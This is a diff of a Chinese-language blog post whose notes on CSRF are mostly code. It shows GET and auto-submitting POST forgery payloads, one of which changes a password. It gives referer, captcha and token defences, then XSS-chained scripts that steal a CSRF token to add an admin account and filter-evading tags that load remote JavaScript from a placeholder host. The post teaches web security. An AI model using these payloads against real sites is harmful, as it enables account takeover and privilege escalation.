@@ -10,33 +10,30 @@
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
     
     <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
-    <meta name="description" content="请求方式get利用html里的带src属性的元素发出跨域请求           post                 document.getElementById(&quot;hack&quot;).submit();   防御方法验证referer data:协议访问和https向http跳转时候referer为空 把文件放在一个GOOGLE.COM的目录，绕过关键字验证  使用验证码影响用户体验 使用cs">
+    <meta name="description" content="请求方式get利用html里的带src属性的元素发出跨域请求 &lt;link href&#x3D;&quot;url&quot;&gt; &lt;img src&#x3D;&quot;url&quot;&gt; &lt;iframe src&#x3D;&quot;url&quot;&gt; &lt;meta http-equiv&#x3D;&quot;refresh&quot; content&#x3D;&quot;0;url&#x3D;url&quot;&gt; &lt;script src&#x3D;&quot;url&quot;&gt; &lt;video src&#x3D;&quot;url&quot;&gt; &lt;audio src">
 <meta property="og:type" content="article">
 <meta property="og:title" content="csrf">
 <meta property="og:url" content="https://0xr1ngs.github.io/2018/06/09/csrf/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="请求方式get利用html里的带src属性的元素发出跨域请求           post                 document.getElementById(&quot;hack&quot;).submit();   防御方法验证referer data:协议访问和https向http跳转时候referer为空 把文件放在一个GOOGLE.COM的目录，绕过关键字验证  使用验证码影响用户体验 使用cs">
+<meta property="og:description" content="请求方式get利用html里的带src属性的元素发出跨域请求 &lt;link href&#x3D;&quot;url&quot;&gt; &lt;img src&#x3D;&quot;url&quot;&gt; &lt;iframe src&#x3D;&quot;url&quot;&gt; &lt;meta http-equiv&#x3D;&quot;refresh&quot; content&#x3D;&quot;0;url&#x3D;url&quot;&gt; &lt;script src&#x3D;&quot;url&quot;&gt; &lt;video src&#x3D;&quot;url&quot;&gt; &lt;audio src">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://0xr1ngs.github.io/2018/06/09/csrf/url">
-<meta property="og:image" content="https://0xr1ngs.github.io/2018/06/09/csrf/url">
 <meta property="article:published_time" content="2018-06-09T09:18:33.000Z">
-<meta property="article:modified_time" content="2023-07-10T09:51:18.054Z">
+<meta property="article:modified_time" content="2023-07-10T10:19:35.820Z">
 <meta property="article:author" content="r1ngs">
 <meta property="article:tag" content="csrf">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://0xr1ngs.github.io/2018/06/09/csrf/url">
     
 <link rel="stylesheet" href="/lib/fancybox/fancybox.css">
 <link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
 
 
-    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1688982682189">
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1688984800626">
     
-    <link rel="stylesheet" href="/css/style.css?v=1688982682189">
+    <link rel="stylesheet" href="/css/style.css?v=1688984800626">
 
     
         
-            <link rel="stylesheet" href="/custom.css?v=1688982682189">
+            <link rel="stylesheet" href="/custom.css?v=1688984800626">
         
     
 
@@ -45,7 +42,7 @@
 <script src="/lib/fancybox/fancybox.umd.js" async></script>
 
 
-    <script async src="/js/app.js?v=1688982682189"></script>
+    <script async src="/js/app.js?v=1688984800626"></script>
     
      
 
@@ -291,23 +288,23 @@
 </div>
 
     <h1 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h1><h2 id="get"><a href="#get" class="headerlink" title="get"></a>get</h2><p>利用html里的带src属性的元素发出跨域请求</p>
-<pre class="line-numbers language-HTML"><code class="language-HTML"><link href="url">
-<img src="url" onerror="alert(1)">
-<iframe src="url">
-<meta http-equiv="refresh" content="0";url="url">
-<script src="url">
-<video src="url">
-<audio src="url">
-<a href="url">
-<table background="url">
+<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>refresh<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0;url<span class="token punctuation">=</span>url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>video</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>audio</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">background</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="post"><a href="#post" class="headerlink" title="post"></a>post</h2><pre class="line-numbers language-HTML"><code class="language-HTML"><form method="POST" id="hack" action="url">
-    <input type="hidden" name="passwd_new" value="csrf">
-    <input type="hidden" name="passwd_conf" value="csrf">
-</form>
-<script>
-    document.getElementById("hack").submit();
-</script>
+<h2 id="post"><a href="#post" class="headerlink" title="post"></a>post</h2><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hack<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>passwd_new<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>csrf<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>passwd_conf<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>csrf<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
+    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"hack"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h1 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h1><h2 id="验证referer"><a href="#验证referer" class="headerlink" title="验证referer"></a>验证referer</h2><ul>
 <li>data:协议访问和https向http跳转时候referer为空</li>
@@ -316,32 +313,32 @@
 <h2 id="使用验证码"><a href="#使用验证码" class="headerlink" title="使用验证码"></a>使用验证码</h2><p>影响用户体验</p>
 <h2 id="使用csrf-token"><a href="#使用csrf-token" class="headerlink" title="使用csrf token"></a>使用csrf token</h2><p>攻击者无法使用js获取外域页面的token值，遵循同源策略</p>
 <h2 id="配合xss攻击"><a href="#配合xss攻击" class="headerlink" title="配合xss攻击"></a>配合xss攻击</h2><p>如果网站还存在着一个xss漏洞，可以用xss窃取同域的csrftoken然后发起csrf攻击<br>可以在有xss漏洞的页面嵌入以下代码</p>
-<pre class="line-numbers language-HTML"><code class="language-HTML"><iframe src="../csrf" onload=alert(frames[0].document.getElementsByName('user_token')[0].value)><!--成功-->
-<iframe src="../csrf" onload=window.open("../csrf/?password_new=admin&password_conf=admin&Change=Change&user_token="+frames[0].document.getElementsByName('user_token')[0].value+"#")>
-<!--失败 报错csrf token is incorrect 用window.open重新打开一个以面后token刷新了-->
+<pre class="line-numbers language-html"><code class="language-html">&lt;iframe src="../csrf" onload=alert(frames[0].document.getElementsByName('user_token')[0].value)><span class="token comment" spellcheck="true">&lt;!--成功--></span>
+&lt;iframe src="../csrf" onload=window.open("../csrf/?password_new=admin&amp;password_conf=admin&amp;Change=Change&amp;user_token="+frames[0].document.getElementsByName('user_token')[0].value+"#")>
+<span class="token comment" spellcheck="true">&lt;!--失败 报错csrf token is incorrect 用window.open重新打开一个以面后token刷新了--></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>没有过滤script关键字</p>
-<pre class="line-numbers language-JavaScript"><code class="language-JavaScript"><script>
-    var frameObj = document.createElement("iframe");
-    frameObj.setAttribute("id", "add");
-    document.body.appendChild(frameObj);
-    document.getElementById("add").src = "admin.php?c=admin&f=save";
-    var token = document.getElementById("add").contentWindow.document.getElementById("token").value; //从iframe中的页面中获取token值
-    var xmlhttp;
-    if (window.XMLHttpRequest) { // code for IE7+, Firefox, Chrome, Opera, Safari
-        xmlhttp = new XMLHttpRequest();
-    } else { // code for IE6, IE5
-        xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
-    }
-    xmlhttp.open("POST", "admin.php?c=admin&f=save", true);
-    xmlhttp.send("id=1&accont=wooyun&pass=123456&status=1&if_system=1&token="+token); //带上token提交添加管理员的请求
-</script>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
+    <span class="token keyword">var</span> frameObj <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    frameObj<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">,</span> <span class="token string">"add"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>frameObj<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"add"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"admin.php?c=admin&amp;f=save"</span><span class="token punctuation">;</span>
+    <span class="token keyword">var</span> token <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"add"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//从iframe中的页面中获取token值</span>
+    <span class="token keyword">var</span> xmlhttp<span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>XMLHttpRequest<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// code for IE7+, Firefox, Chrome, Opera, Safari</span>
+        xmlhttp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// code for IE6, IE5</span>
+        xmlhttp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"Microsoft.XMLHTTP"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    xmlhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string">"admin.php?c=admin&amp;f=save"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    xmlhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"id=1&amp;accont=wooyun&amp;pass=123456&amp;status=1&amp;if_system=1&amp;token="</span><span class="token operator">+</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//带上token提交添加管理员的请求</span>
+</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>过滤关键字，加载远程的js代码</p>
-<pre class="line-numbers language-HTML"><code class="language-HTML"><img src=1 onerror=document.body.appendChild(document.createElement('script')).src='url'>
-<object data="data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3h4eC54eHgvYS5qcz48L3NjcmlwdD4="></object>
-<iframe src="data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3h4eC54eHgvYS5qcz48L3NjcmlwdD4="></iframe>
-<script src=http://xxx.xxx/a.js></script>
+<pre class="line-numbers language-html"><code class="language-html">&lt;img src=1 onerror=document.body.appendChild(document.createElement('script')).src='url'>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">data</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3h4eC54eHgvYS5qcz48L3NjcmlwdD4<span class="token punctuation">=</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3h4eC54eHgvYS5qcz48L3NjcmlwdD4<span class="token punctuation">=</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>http://xxx.xxx/a.js</span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
     
@@ -360,7 +357,7 @@
 </div>
   
   
-    <script async src="/js/copy-codeblock.js?v=1688982682121"></script>
+    <script async src="/js/copy-codeblock.js?v=1688984800556"></script>
   
 
   
@@ -381,7 +378,7 @@
                               <button class="mdui-fab catalog" style="overflow:unset;">
                                   <i class="nexmoefont icon-i-catalog"></i>
                                   <div class="nexmoe-toc">
-                                      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F"><span class="toc-number">1.</span> <span class="toc-text">请求方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#get"><span class="toc-number">1.1.</span> <span class="toc-text">get</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">防御方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81referer"><span class="toc-number">2.1.</span> <span class="toc-text">验证referer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E9%AA%8C%E8%AF%81%E7%A0%81"><span class="toc-number">2.2.</span> <span class="toc-text">使用验证码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8csrf-token"><span class="toc-number">2.3.</span> <span class="toc-text">使用csrf token</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E5%90%88xss%E6%94%BB%E5%87%BB"><span class="toc-number">2.4.</span> <span class="toc-text">配合xss攻击</span></a></li></ol></li></ol>
+                                      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F"><span class="toc-number">1.</span> <span class="toc-text">请求方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#get"><span class="toc-number">1.1.</span> <span class="toc-text">get</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#post"><span class="toc-number">1.2.</span> <span class="toc-text">post</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">防御方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81referer"><span class="toc-number">2.1.</span> <span class="toc-text">验证referer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E9%AA%8C%E8%AF%81%E7%A0%81"><span class="toc-number">2.2.</span> <span class="toc-text">使用验证码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8csrf-token"><span class="toc-number">2.3.</span> <span class="toc-text">使用csrf token</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E5%90%88xss%E6%94%BB%E5%87%BB"><span class="toc-number">2.4.</span> <span class="toc-text">配合xss攻击</span></a></li></ol></li></ol>
                                   </div>
                               </button>
                           
